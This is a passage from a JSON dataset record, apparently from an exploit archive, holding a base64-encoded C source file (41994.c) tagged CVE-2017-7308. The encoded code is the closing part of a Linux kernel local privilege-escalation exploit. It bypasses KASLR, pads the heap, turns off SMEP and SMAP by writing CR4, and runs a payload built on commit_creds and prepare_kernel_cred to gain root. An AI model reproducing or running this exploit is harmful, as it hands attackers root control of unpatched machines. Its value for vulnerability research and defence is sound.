sZi9naWRfbWFwKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJY3B1X3NldF90IG15X3NldDsNCglDUFVfWkVSTygmbXlfc2V0KTsNCglDUFVfU0VUKDAsICZteV9zZXQpOw0KCWlmIChzY2hlZF9zZXRhZmZpbml0eSgwLCBzaXplb2YobXlfc2V0KSwgJm15X3NldCkgIT0gMCkgew0KCQlwZXJyb3IoIlstXSBzY2hlZF9zZXRhZmZpbml0eSgpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglpZiAoc3lzdGVtKCIvc2Jpbi9pZmNvbmZpZyBsbyB1cCIpICE9IDApIHsNCgkJcGVycm9yKCJbLV0gc3lzdGVtKC9zYmluL2lmY29uZmlnIGxvIHVwKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQppbnQgbWFpbigpIHsNCglwcmludGYoIlsuXSBzdGFydGluZ1xuIik7DQoNCglzZXR1cF9zYW5kYm94KCk7DQoNCglwcmludGYoIlsuXSBuYW1lc3BhY2Ugc2FuZGJveCBzZXQgdXBcbiIpOw0KDQojaWYgRU5BQkxFX0tBU0xSX0JZUEFTUw0KCXByaW50ZigiWy5dIEtBU0xSIGJ5cGFzcyBlbmFibGVkLCBnZXR0aW5nIGtlcm5lbCBhZGRyXG4iKTsNCglLRVJORUxfQkFTRSA9IGdldF9rZXJuZWxfYWRkcigpOw0KCXByaW50ZigiWy5dIGRvbmUsIGtlcm5lbCB0ZXh0OiAgICVseFxuIiwgS0VSTkVMX0JBU0UpOw0KI2VuZGlmDQoNCglwcmludGYoIlsuXSBjb21taXRfY3JlZHM6ICAgICAgICAlbHhcbiIsIEtFUk5FTF9CQVNFICsgQ09NTUlUX0NSRURTKTsNCglwcmludGYoIlsuXSBwcmVwYXJlX2tlcm5lbF9jcmVkOiAlbHhcbiIsIEtFUk5FTF9CQVNFICsgUFJFUEFSRV9LRVJORUxfQ1JFRCk7DQoNCiNpZiBFTkFCTEVfU01FUF9TTUFQX0JZUEFTUw0KCXByaW50ZigiWy5dIG5hdGl2ZV93cml0ZV9jcjQ6ICAgICVseFxuIiwgS0VSTkVMX0JBU0UgKyBOQVRJVkVfV1JJVEVfQ1I0KTsNCiNlbmRpZg0KDQoJcHJpbnRmKCJbLl0gcGFkZGluZyBoZWFwXG4iKTsNCglrbWFsbG9jX3BhZChLTUFMTE9DX1BBRCk7DQoJcGFnZWFsbG9jX3BhZChQQUdFQUxMT0NfUEFEKTsNCglwcmludGYoIlsuXSBkb25lLCBoZWFwIGlzIHBhZGRlZFxuIik7DQoNCiNpZiBFTkFCTEVfU01FUF9TTUFQX0JZUEFTUw0KCXByaW50ZigiWy5dIFNNRVAgJiBTTUFQIGJ5cGFzcyBlbmFibGVkLCB0dXJuaW5nIHRoZW0gb2ZmXG4iKTsNCglvb2JfdGltZXJfZXhlY3V0ZSgodm9pZCAqKShLRVJORUxfQkFTRSArIE5BVElWRV9XUklURV9DUjQpLCBDUjRfREVTSVJFRF9WQUxVRSk7DQoJcHJpbnRmKCJbLl0gZG9uZSwgU01FUCAmIFNNQVAgc2hvdWxkIGJlIG9mZiBub3dcbiIpOw0KI2VuZGlmDQoNCglwcmludGYoIlsuXSBleGVjdXRpbmcgZ2V0IHJvb3QgcGF5bG9hZCAlcFxuIiwgJmdldF9yb290X3BheWxvYWQpOw0KCW9vYl9pZF9tYXRjaF9leGVjdXRlKCh2b2lkICopJmdldF9yb290X3BheWxvYWQpOw0KCXByaW50ZigiWy5dIGRvbmUsIHNob3VsZCBiZSByb290IG5vd1xuIik7DQoNCgljaGVja19yb290KCk7DQoNCgl3aGlsZSAoMSkgc2xlZXAoMTAwMCk7DQoNCglyZXR1cm4gMDsNCn0=", 
    "filename": "platforms/linux/local/41994.c", 
    "id": "41994", 
    "cves": [
        "CVE-2017-7308"
    ]
}